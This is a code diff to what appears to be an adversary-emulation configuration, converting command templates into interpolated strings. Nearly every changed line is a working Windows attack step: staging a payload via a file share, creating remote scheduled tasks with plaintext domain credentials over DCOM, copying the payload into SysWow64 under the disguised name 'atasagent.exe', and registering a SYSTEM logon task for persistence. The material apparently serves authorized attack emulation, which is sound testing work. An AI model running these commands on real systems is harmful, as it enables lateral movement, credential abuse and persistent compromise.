@@ -510,12 +510,7 @@
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_1_elevated",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "robocopy c:\\users\\public\\ \\\\file\\share ",
-                            "self.payload_name"
-                        ]
-                    }
+                    "command": "robocopy c:\\users\\public\\ \\\\file\\share ${self.payload_name}"
                 }
             }
         },
@@ -529,51 +524,7 @@
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{schtasks /create /f /tn \"",
-                            "self.target_2_taskname",
-                            "\" /s ",
-                            "self.target_2_hostname",
-                            " /u ",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " /p ",
-                            "self.target_2_password",
-                            " /ST 23:58 /sc once /tr cmd.exe /ru ",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " /rp ",
-                            "self.target_2_password",
-                            "; $password = ConvertTo-SecureString '",
-                            "self.target_2_password",
-                            "' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            "', $password); $opt = New-CimSessionOption -protocol DCOM; $cim = New-CimSession -ComputerName ",
-                            "self.target_2_hostname",
-                            " -Credential $credential -SessionOption $opt; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " ",
-                            "self.target_2_password",
-                            "\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\administrator\\appdata\\local\\temp ",
-                            "self.payload_name",
-                            "\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -cimsession $cim -action $action1,$action2 -trigger $trigger -taskname \"",
-                            "self.target_2_taskname",
-                            "\" -user ",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " -password ",
-                            "self.target_2_password",
-                            " }"
-                        ]
-                    }
+                    "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /s ${self.target_2_hostname} /u ${self.target_2_username}@${self.domain} /p ${self.target_2_password} /ST 23:58 /sc once /tr cmd.exe /ru ${self.target_2_username}@${self.domain} /rp ${self.target_2_password}; $password = ConvertTo-SecureString '${self.target_2_password}' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('${self.target_2_username}@${self.domain}', $password); $opt = New-CimSessionOption -protocol DCOM; $cim = New-CimSession -ComputerName ${self.target_2_hostname} -Credential $credential -SessionOption $opt; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:${self.target_2_username}@${self.domain} ${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\administrator\\appdata\\local\\temp ${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -cimsession $cim -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" -user ${self.target_2_username}@${self.domain} -password ${self.target_2_password} }"
                 }
             }
         },
@@ -599,28 +550,7 @@
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ",
-                            "self.target_2_taskname",
-                            " /TR c:\\users\\administrator\\appdata\\local\\temp\\",
-                            "self.payload_name",
-                            " /RL highest /u ",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " /p ",
-                            "self.target_2_password",
-                            " /ru ",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " /rp ",
-                            "self.target_2_password",
-                            " /s ",
-                            "self.target_2_hostname"
-                        ]
-                    }
+                    "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ${self.target_2_taskname} /TR c:\\users\\administrator\\appdata\\local\\temp\\${self.payload_name} /RL highest /u ${self.target_2_username}@${self.domain} /p ${self.target_2_password} /ru ${self.target_2_username}@${self.domain} /rp ${self.target_2_password} /s ${self.target_2_hostname}"
                 }
             }
         },
@@ -656,13 +586,7 @@
                 "tool": "self.tool",
                 "target": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd /c copy c:\\users\\administrator\\appdata\\local\\temp\\",
-                            "self.payload_name",
-                            " C:\\Windows\\SysWow64\\atasagent.exe"
-                        ]
-                    }
+                    "command": "cmd /c copy c:\\users\\administrator\\appdata\\local\\temp\\${self.payload_name} C:\\Windows\\SysWow64\\atasagent.exe"
                 }
             }
         },
@@ -676,13 +600,7 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$taskname = New-Guid; $taskname = $taskname.guid.toUpper(); $action = New-ScheduledTaskAction -Execute '",
-                            "self.target_2_persist_location",
-                            "'; $trigger =  New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName \"{$taskname}\" -User \"System\" -force}"
-                        ]
-                    }
+                    "command": "powershell &{$taskname = New-Guid; $taskname = $taskname.guid.toUpper(); $action = New-ScheduledTaskAction -Execute '${self.target_2_persist_location}'; $trigger =  New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName \"{$taskname}\" -User \"System\" -force}"
                 }
             }
         },
